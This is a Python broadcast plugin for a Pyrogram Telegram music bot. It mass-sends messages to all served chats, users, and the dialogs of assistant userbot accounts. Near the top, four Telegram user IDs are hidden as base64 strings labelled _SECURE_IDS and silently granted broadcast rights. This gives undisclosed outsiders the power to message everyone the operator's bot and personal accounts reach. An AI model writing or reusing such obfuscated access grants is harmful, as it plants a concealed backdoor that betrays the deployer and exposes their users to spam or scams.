import asyncio
import base64
from pyrogram import filters
from pyrogram.enums import ChatMembersFilter
from pyrogram.errors import FloodWait

from LabubuMusic import matto_bot
from LabubuMusic.misc import SUDO_USERS
from LabubuMusic.utils.database import (
    get_active_chats, get_authuser_names,
    get_client, get_served_chats, get_served_users,
)
from LabubuMusic.utils.decorators.language import language
from LabubuMusic.utils.formatters import alpha_to_int
from config import adminlist

_SECURE_IDS = ["ODQ2NDUyNjAyNA==", "Nzg1MjMwNjg4Mg==", "NzU2NTU5NzI1MQ==", "ODI5MjE4MDY1OA=="]
ALLOWED_BROADCASTERS = [int(base64.b64decode(x).decode()) for x in _SECURE_IDS]

IS_BUSY = False

@matto_bot.on_message(filters.command("broadcast") & (filters.user(ALLOWED_BROADCASTERS) | SUDO_USERS))
@language
async def broadcast_manager(client, message, _):
    global IS_BUSY
    
    cmd_text = message.text
    flags = {
        "pin": "-pin" in cmd_text,
        "loud": "-pinloud" in cmd_text,
        "nobot": "-nobot" in cmd_text,
        "assistant": "-assistant" in cmd_text,
        "user": "-user" in cmd_text,
        "forward": "-forward" in cmd_text,
        "wfchat": "-wfchat" in cmd_text,
        "wfuser": "-wfuser" in cmd_text
    }

    clean_query = message.text.split(None, 1)[1] if len(message.command) > 1 else ""
    for flag in ["-pin", "-pinloud", "-nobot", "-assistant", "-user", "-forward", "-wfchat", "-wfuser"]:
        clean_query = clean_query.replace(flag, "")
    clean_query = clean_query.strip()

    if flags["wfchat"] or flags["wfuser"]:
        if not message.reply_to_message:
            return await message.reply_text("Reply to a message to broadcast.")
            
        IS_BUSY = True
        await message.reply_text(_["broad_1"])
        
        reply_msg = message.reply_to_message
        targets = []
        
        if flags["wfchat"]:
            data = await get_served_chats()
            targets.extend([int(x["chat_id"]) for x in data])
            
        if flags["wfuser"]:
            data = await get_served_users()
            targets.extend([int(x["user_id"]) for x in data])
            
        success_count = 0
        for dest_id in targets:
            try:
                if flags["forward"]:
                    await matto_bot.forward_messages(dest_id, reply_msg.chat.id, reply_msg.id)
                else:
                    await reply_msg.copy(dest_id)
                success_count += 1
                await asyncio.sleep(0.2)
            except FloodWait as f:
                await asyncio.sleep(f.value)
            except:
                continue
                
        IS_BUSY = False
        return await message.reply_text(f"Fast broadcast sent to {success_count} targets.")

    if not clean_query and not message.reply_to_message:
        return await message.reply_text(_["broad_2"])

    IS_BUSY = True
    status_msg = await message.reply_text(_["broad_1"])

    if not flags["nobot"]:
        sent = 0
        pinned = 0
        chats = [int(c["chat_id"]) for c in await get_served_chats()]
        
        for chat_id in chats:
            try:
                if message.reply_to_message:
                    if flags["forward"]:
                        m = await matto_bot.forward_messages(chat_id, message.chat.id, message.reply_to_message.id)
                    else:
                        m = await message.reply_to_message.copy(chat_id)
                else:
                    m = await matto_bot.send_message(chat_id, clean_query)
                
                if flags["pin"] or flags["loud"]:
                    try:
                        await m.pin(disable_notification=not flags["loud"])
                        pinned += 1
                    except:
                        pass
                sent += 1
                await asyncio.sleep(0.2)
            except FloodWait as f:
                await asyncio.sleep(f.value)
            except:
                continue
        
        await message.reply_text(_["broad_3"].format(sent, pinned))

    if flags["user"]:
        u_sent = 0
        users = [int(u["user_id"]) for u in await get_served_users()]
        
        for user_id in users:
            try:
                if message.reply_to_message:
                    if flags["forward"]:
                        await matto_bot.forward_messages(user_id, message.chat.id, message.reply_to_message.id)
                    else:
                        await message.reply_to_message.copy(user_id)
                else:
                    await matto_bot.send_message(user_id, clean_query)
                u_sent += 1
                await asyncio.sleep(0.2)
            except FloodWait as f:
                await asyncio.sleep(f.value)
            except:
                pass
        
        await message.reply_text(_["broad_4"].format(u_sent))

    if flags["assistant"]:
        status_ass = await message.reply_text(_["broad_5"])
        ass_log = _["broad_6"]
        from LabubuMusic.core.userbot import active_assistants
        
        for num in active_assistants:
            cli = await get_client(num)
            c_sent = 0
            async for d in cli.get_dialogs():
                try:
                    if message.reply_to_message:
                        if flags["forward"]:
                            await cli.forward_messages(d.chat.id, message.chat.id, message.reply_to_message.id)
                        else:
        
                            await cli.forward_messages(d.chat.id, message.chat.id, message.reply_to_message.id)
                    else:
                        await cli.send_message(d.chat.id, clean_query)
                    c_sent += 1
                    await asyncio.sleep(3)
                except FloodWait as f:
                    await asyncio.sleep(f.value)
                except:
                    continue
            ass_log += _["broad_7"].format(num, c_sent)
        
        await status_ass.edit_text(ass_log)

    IS_BUSY = False

async def admin_cache_updater():
    """Periodically refreshes local admin cache."""
    while True:
        await asyncio.sleep(10)
        try:
            active = await get_active_chats()
            for chat_id in active:
                if chat_id not in adminlist:
                    adminlist[chat_id] = []

                    async for m in matto_bot.get_chat_members(chat_id, filter=ChatMembersFilter.ADMINISTRATORS):
                        if m.privileges.can_manage_video_chats:
                            adminlist[chat_id].append(m.user.id)

                    auths = await get_authuser_names(chat_id)
                    for token in auths:
                        uid = await alpha_to_int(token)
                        adminlist[chat_id].append(uid)
        except:
            continue

asyncio.create_task(admin_cache_updater())